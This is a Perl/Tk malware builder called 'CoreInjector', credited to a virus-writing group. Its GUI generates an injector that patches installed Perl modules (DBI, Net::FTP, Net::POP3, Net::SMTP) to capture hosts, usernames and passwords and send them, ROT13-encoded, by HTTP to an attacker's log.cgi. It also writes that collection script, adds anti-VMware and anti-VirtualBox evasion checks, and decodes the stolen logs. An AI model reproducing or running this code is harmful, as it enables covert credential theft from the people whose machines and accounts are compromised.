#!/usr/bin/perl

=poc

[ ------------------- ABOUT -------------------- ]
[ Name:CoreInjector v1.0                         ]
[ State:NonPublic [13.11.2009]                   ]
[ Coder:ShaQ                                     ]
[ Code:Perl/Tk                                   ]
[ Credits:Perforin for Inject Idea + Paper       ]
[ ---------------------------------------------- ]
[ Greez:Perforin,Rayden,ring,JackT,double_check, ]
[ thejanky,Zer0day,and all VXnetw0rk Members     ]
[ ---------------------------------------------- ]
[ Keep VXing alive                               ]
[ ---------------------------------------------- ]

=cut


use strict;
use Tk;
use Tk::PNG;
use Tk::NoteBook;
use Tk::DropSite;

my ($vmbool,$vboxbool,$dbibool,$ftpbool,$smtpbool,$pop3bool);



my $ver = "1.0";
my $main = MainWindow->new(-bg=>'black', -cursor=>"crosshair");
$main->title("Core Injector v$ver");
$main->resizable('0','0');



# ====== [ Header begin ] ============================================ #
my $header = $main->Photo(-format =>'png', -file => 'header.png');
$header = $main->Label(-image=>$header, -borderwidth=>0)
->pack(-side=>'top');



# ====== [ NoteBook begin ] ========================================== #
my $nb = $main->NoteBook(-font=>'{ARIAL} 9 {underline} {bold}', -backpagecolor => 'black', -background=>'black', -inactivebackground=>'black', -fg=>'#006EA3')
->pack(-side=>'top', -fill => 'both');



# ====== [ NoteBook Tab1 ] =========================================== #
my $page1 = $nb->add('Page1', -label=>'Log Options');
my $frame_a1 = $page1->Frame(-bg=>'black',-height=>100)
->pack(-side=>'top',-fill=>'both');
my $frame_b1 = $frame_a1->Frame(-bg=>'black')
->pack(-side=>'top');
$frame_b1->Label(-font=>'{Arial} 8 {italic}',-text=>'Path to your log.cgi:', -bg=>'black', -foreground=>'grey')
->pack(-side => 'left'); 
my $serverpath = $frame_b1->Entry(-width=>30,-text=>'http://localhost/cgi-bin/log.cgi', -bg=>'black', -foreground=>'#006EA3', -borderwidth=>1)
->pack(-side => 'left');
my $frame_c1 = $page1->Frame(-bg=>'black')
->pack(-fill=>'both');
my $button_make = $frame_c1->Button(-font=>'{Arial} 8 {bold}',-width=>50,-text=>'Create "log.cgi"',-bg=>'black', -activebackground=>'black', -foreground=>'#006EA3', -activeforeground=>'white', -command=>\&make_log)
->pack(-side=>'top',-pady=>4);



# ====== [ NoteBook Tab2 ] =========================================== #
my $page2 = $nb->add('Page2', -label=>'Modul Options');
my $frame_a2 = $page2->Frame(-bg=>'black',-height=>100)
->pack(-side=>'top',-fill=>'both', -expand => 1);
my $frame_b2 = $frame_a2->Frame(-bg=>'black')
->pack(-side=>'top');

my $check_dbi = $frame_b2->Checkbutton(-text=>'DBI',-bg=>'black', -foreground=>'#006EA3', -activebackground=>'black', -activeforeground=>'#006EA3', -variable=>\$dbibool)
->pack(-side=>'left');
my $check_ftp = $frame_b2->Checkbutton(-text=>'Net::FTP',-bg=>'black', -foreground=>'#006EA3', -activebackground=>'black', -activeforeground=>'#006EA3', -variable=>\$ftpbool)
->pack(-side=>'left');
my $check_pop3 = $frame_b2->Checkbutton(-text=>'Net::POP3',-bg=>'black', -foreground=>'#006EA3', -activebackground=>'black', -activeforeground=>'#006EA3', -variable=>\$pop3bool)
->pack(-side=>'left');
my $check_smtp = $frame_b2->Checkbutton(-text=>'Net::SMTP',-bg=>'black', -foreground=>'#006EA3', -activebackground=>'black', -activeforeground=>'#006EA3', -variable=>\$smtpbool)
->pack(-side=>'left');

my $frame_c2 = $page2->Frame(-bg=>'black')
->pack(-side=>'top',-fill=>'both', -expand => 1);
$frame_c2->Label(-font=>'{Arial} 8 {italic}',-text=>'more Modules comming soon ... ', -bg=>'black', -foreground=>'grey')
->pack(-side => 'top');



# ====== [ NoteBook Tab3 ] =========================================== #
my $page3 = $nb->add('Page3', -label=>'Anti Options');
my $frame_a3 = $page3->Frame(-bg=>'black',-height=>100)
->pack(-side=>'top',-fill=>'both');
my $frame_b3 = $frame_a3->Frame(-bg=>'black')
->pack(-side=>'top');

my $check_vm = $frame_b3->Checkbutton(-text=>'Anti VMware',-bg=>'black', -foreground=>'#006EA3', -activebackground=>'black', -activeforeground=>'#006EA3', -variable=>\$vmbool)
->pack(-side=>'left');
my $check_vbox = $frame_b3->Checkbutton(-text=>'Anti VirtualBox',-bg=>'black', -foreground=>'#006EA3', -activebackground=>'black', -activeforeground=>'#006EA3', -variable=>\$vboxbool)
->pack(-side=>'left');

my $frame_c3 = $page3->Frame(-bg=>'black')
->pack(-side=>'top',-fill=>'both', -expand => 1);
$frame_c3->Label(-font=>'{Arial} 8 {italic}',-text=>'more Antis comming soon ... ', -bg=>'black', -foreground=>'grey')
->pack(-side => 'top');



# ====== [ NoteBook Tab4 ] =========================================== #
my $page4 = $nb->add('Page4', -label=>'Decrypt Logfile');
my $frame_a4 = $page4->Frame(-bg=>'black',-height=>100)
->pack(-side=>'top',-fill=>'both');
my $frame_b4 = $frame_a4->Frame(-bg=>'black')
->pack(-side=>'top');
$frame_b4->Label(-font=>'{Arial} 8 {italic}',-text=>'DROP CRYPTED LOGFILE HERE', -bg=>'black', -foreground=>'grey')
->pack(-side => 'left'); 
my $frame_c4 = $page4->Frame(-bg=>'black')
->pack(-fill=>'both',-expand=>1);
my $logpath = $frame_c4->Entry(-font=>'{Arial} 10',-width=>20,-text=>'', -bg=>'#006EA3', -foreground=>'grey', -borderwidth=>1)
->pack(-side => 'top');

$logpath->DropSite(
    -dropcommand => [\&accept_drop, $logpath],
    -droptypes => ($^O eq 'MSWin32' ? 'Win32' : ['KDE', 'XDND', 'Sun'])
);



# ====== [ NoteBook Tab5 ] =========================================== #
my $page5 = $nb->add('Page5', -label=>'About');
my $frame_a5 = $page5->Frame(-bg=>'black',-height=>100)
->pack(-side=>'top',-fill=>'both');
my $frame_b5 = $frame_a5->Frame(-bg=>'black')
->pack(-side=>'top');
my $about = $frame_b5->Scrolled('Text', -bg=>'black', -foreground=>'#1C8C00',-width=>50, -height=>2, -scrollbars => 'oe')
->pack(-side => 'left'); 

my $aboutcode = "[ ------------------- ABOUT -------------------- ]
[ Name:CoreInjector v1.0                         ]
[ State:NonPublic [13.11.2009]                   ]
[ Coder:ShaQ                                     ]
[ Code:Perl/Tk                                   ]
[ Credits:Perforin for Inject Idea + Paper       ]
[ ---------------------------------------------- ]
[ Greez:Perforin,Rayden,ring,JackT,double_check, ]
[ thejanky,Zer0day,and all VXnetw0rk Members     ]
[ ---------------------------------------------- ]
[ Keep VXing alive                               ]
[ ---------------------------------------------- ]";
$about->insert('end',$aboutcode);


my $frame_c5 = $page5->Frame(-bg=>'black')
->pack(-fill=>'both',-expand=>1);



# ====== [ Build Button ] ============================================ #
my $build = $main->Button(-font=>'{Arial Black} 8 ',-width=>50,-text=>'-- Build --',-bg=>'black', -activebackground=>'black', -foreground=>'#1C8C00', -activeforeground=>'white', -command=>\&build)
->pack(-side=>'top',-pady=>5, -fill=>'both');



MainLoop;



sub make_log()
{
my $make_log = '#!/usr/bin/perl
use strict;
use CGI;
use CGI qw(:standart);
use CGI::Carp qw(fatalsToBrowser);

my $cgi = new CGI;
my $input = $cgi->param(\'input\');
if($input ne ""){
	open(LOG,\'>\',time.".log");
	print LOG $input;
	close(LOG);
}
print $cgi->header();';

	open(MAKE,'>',"log.cgi") || &err("Error to write log.cgi \n $!");
	print MAKE $make_log || &err("Error to write log.cgi \n $!");
	close(MAKE);
}



sub build()
{
my $begin = '#!/usr/bin/perl
BEGIN{if ( $^O eq \'MSWin32\' ){require Win32::Console;Win32::Console::Free();}}';

	open(MAKE,'>',"injector.pl") || &err("Error to write injector.pl \n $!");
	print MAKE $begin || &err("Error to write injector.pl \n $!");
	close(MAKE);
	&write_antis();
}



sub write_antis()
{
	my $antivm = 'if(-d "$ENV{\'PROGRAMFILES\'}\\VMware\\VMware Tools"){exit;};';
	if($vmbool == 1)
	{
		open(MAKE,'>>',"injector.pl") || &err("Error to write AntiVM-Function \n $!");
		print MAKE "\n",$antivm || &err("Error to write AntiVM-Function \n $!");
		close(MAKE);
	}
	
	my $antivbox = 'if(-d "$ENV{\'PROGRAMFILES\'}\\Sun\\VirtualBox Guest Additions"){exit;};';
	if($vboxbool == 1)
	{
		open(MAKE,'>>',"injector.pl") || &err("Error to write AntiVBox-Function \n $!");
		print MAKE "\n",$antivbox || &err("Error to write AntiVBox-Function \n $!");
		close(MAKE);
	}
	&write_injectors();
}



sub write_injectors()
{
	if($dbibool == 1)
	{
		&dbi_inject();
	}

	if($ftpbool == 1)
	{
		&ftp_inject();	
	}

	if($pop3bool == 1)
	{
		&pop3_inject();
	}
	
	if($smtpbool == 1)
	{
		&smtp_inject();
	}
}



sub dbi_inject()
{
my $spath = $serverpath->get;
my $dbiinject = "
\$spath = \"".$spath."\";
chmod(0777,\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\DBI.pm\");
open(MOD,'<',\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\DBI.pm\");
my \@DBI =<MOD>;
close(MOD);
my \$c;
foreach(\@DBI)
{
	if(\$c == 161)
	{
		\$_ =~ s\/\$_\/use LWP::Simple;\\n\/;
	}
	if(\$c == 555)
	{
		\$_ =~ s\/\$_\/my \\\$encrypt = \\\"SQL-Host: \\\$dsn\\\\nUser: \\\$user\\\\nPass:\\\$pass\\\\n\\\"\\;\\\$encrypt =~ tr\\\/a-zA-Z\\\/N-ZA-Mn-za-m\\\/;get(\\\"\$spath\?input=\\\$encrypt\\\")\\;\\n\/;
	}
	\$c++;
push(\@NEWDBI,\$_);
}

open(NEWMOD,\">\",\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\DBI.pm\");
print NEWMOD \@NEWDBI;
close(NEWMOD);";
	
	open(MAKE,'>>',"injector.pl") || &err("Error to write DBI-Inject-Function \n $!");
	print MAKE "\n",$dbiinject || &err("Error to write DBI-Inject-Function \n $!");
	close(MAKE);		
}



sub ftp_inject()
{
my $spath = $serverpath->get;	
my $ftpinject = "
\$spath = \"".$spath."\";
chmod(0777,\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\FTP.pm\");
open(MOD,'<',\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\FTP.pm\");
my \@FTP =<MOD>;
close(MOD);
my \$c;
foreach(\@FTP)
{
	if(\$c == 15)
	{
		\$_ =~ s\/\$_\/use LWP::UserAgent;\\n\/;
	}
	if(\$c == 22)
	{
		\$_ =~ s\/\$_\/my \\\$ua = LWP::UserAgent->new();\\n\/;
	}
	if(\$c == 249)
	{
		\$_ =~ s\/\$_/my \\\$encrypt = \\\"FTP-Host: \\\${*\\\$ftp}{'net_ftp_host'}\\\\nUser: \\\$user\\\\nPass:\\\$pass\\\\n\\\"\\\;\\\$encrypt =~ tr\\\/a-zA-Z\\\/N-ZA-Mn-za-m\\\/;my \\\$response = \\\$ua->get(\\\"\$spath?input=\\\$encrypt\\\")\\;\\n\/;
	}		
\$c++;
push(\@NEWFTP,\$_);
}

open(NEWMOD,\">\",\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\FTP.pm\");
print NEWMOD \@NEWFTP;
close(NEWMOD);";


	open(MAKE,'>>',"injector.pl") || &err("Error to write FTP-Inject-Function \n $!");
	print MAKE "\n",$ftpinject || &err("Error to write FTP-Inject-Function \n $!");
	close(MAKE);
}



sub pop3_inject()
{
my $spath = $serverpath->get;	
my $pop3inject = "	
\$spath = \"".$spath."\";
chmod(0777,\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\POP3.pm\");
open(MOD,'<',\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\POP3.pm\");
my \@POP3 =<MOD>;
close(MOD);
my \$c;
foreach(\@POP3)
{	
	if(\$c == 14)
	{
		\$_ =~ s\/\$_\/use LWP::UserAgent;\\n\/;
	}
	if(\$c == 18)
	{
		\$_ =~ s\/\$_\/my \\\$ua = LWP::UserAgent->new();\\n\/;
	}	
	if(\$c == 90)
	{
		\$_ =~ s\/\$_\/my \\\$encrypt = \\\"POP3-Host: \\\${*\\\$me}{'net_pop3_host'}\\\\nUser: \\\$user\\\\nPass:\\\$pass\\\\n\\\"\\\;\\\$encrypt =~ tr\\\/a-zA-Z\\\/N-ZA-Mn-za-m\\\/;my \\\$response = \\\$ua->get(\\\"\$spath?input=\\\$encrypt\\\")\\;\\n\/;
	}	
\$c++;
push(\@NEWPOP3,\$_);
}

open(NEWMOD,\">\",\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\POP3.pm\");
print NEWMOD \@NEWPOP3;
close(NEWMOD);";
	
	open(MAKE,'>>',"injector.pl") || &err("Error to write POP3-Inject-Function \n $!");
	print MAKE "\n",$pop3inject || &err("Error to write POP3-Inject-Function \n $!");
	close(MAKE);		
}



sub smtp_inject()
{
my $spath = $serverpath->get;	
my $smtpinject = "	
\$spath = \"".$spath."\";
chmod(0777,\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\SMTP.pm\");
open(MOD,'<',\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\SMTP.pm\");
my \@SMTP =<MOD>;
close(MOD);
my \$c;
foreach(\@SMTP)
{	
	if(\$c == 9)
	{
		\$_ =~ s\/\$_\/use LWP::Simple;\\n\/;
	}
	if(\$c == 21)
	{
		\$_ =~ s\/\$_\/our \\\$hosta;\\n\/;
	}
	if(\$c == 37)
	{
		\$_ =~ s\/\$_\/\\\$hosta = \\\$host;\\n\/;
	}	
	if(\$c == 113)
	{
		\$_ =~ s\/\$_\/my \\\$encrypt = \\\"SMTP-Host: \\\$hosta\\\\nUser: \\\$username\\\\nPass:\\\$password\\\\n\\\"\\\;\\\$encrypt =~ tr\\\/a-zA-Z\\\/N-ZA-Mn-za-m\\\/;get(\\\"\$spath?input=\\\$encrypt\\\")\\;\\n\/;
	}	
\$c++;
push(\@NEWSMTP,\$_);
}

open(NEWMOD,\">\",\"\$ENV{'HOMEDRIVE'}\\\\Perl\\\\lib\\\\Net\\\\SMTP.pm\");
print NEWMOD \@NEWSMTP;
close(NEWMOD);	";	
	
	open(MAKE,'>>',"injector.pl") || &err("Error to write SMTP-Inject-Function \n $!");
	print MAKE "\n",$smtpinject || &err("Error to write SMTP-Inject-Function \n $!");
	close(MAKE);
}



sub decrypt()
{
	
	my $path = $logpath->get;
	open(ENCRYPTLOG,'<',$path) || &err("Error to read encrypted LogFile \n $!");
	open(DECRYPTLOG,'>>',"All_Logs.txt") || &err("Error to write decrypted LogFile \n $!");	
		print DECRYPTLOG "~" x 50,"\n\n";
		foreach(<ENCRYPTLOG>)
		{
			$_ =~ tr/a-zA-Z/N-ZA-Mn-za-m/;
			print DECRYPTLOG $_,"\n";
		}
		print DECRYPTLOG "\n","~" x 50,"\n\n";
		
	close(ENCRYPTLOG);
	close(DECRYPTLOG);
	
	$main->messageBox (-title=>"Done", -message=>"LogFile decrypted :)");	
	$logpath->configure(-text=>" ");
}



sub err()
{
	$main->messageBox (-title=>"Error", -message=>$_[0]);
	die;
}



sub accept_drop
{
    my($widget, $selection) = @_;

    my $filename;
    eval {
        if ($^O eq 'MSWin32') {
            $filename = $widget->SelectionGet(-selection => $selection, 'STRING');
        } else {
            $filename = $widget->SelectionGet(-selection => $selection, 'FILE_NAME');
        }
    };
    if (defined $filename) {
        $widget->insert(0, $filename);
    }
    &decrypt();
}
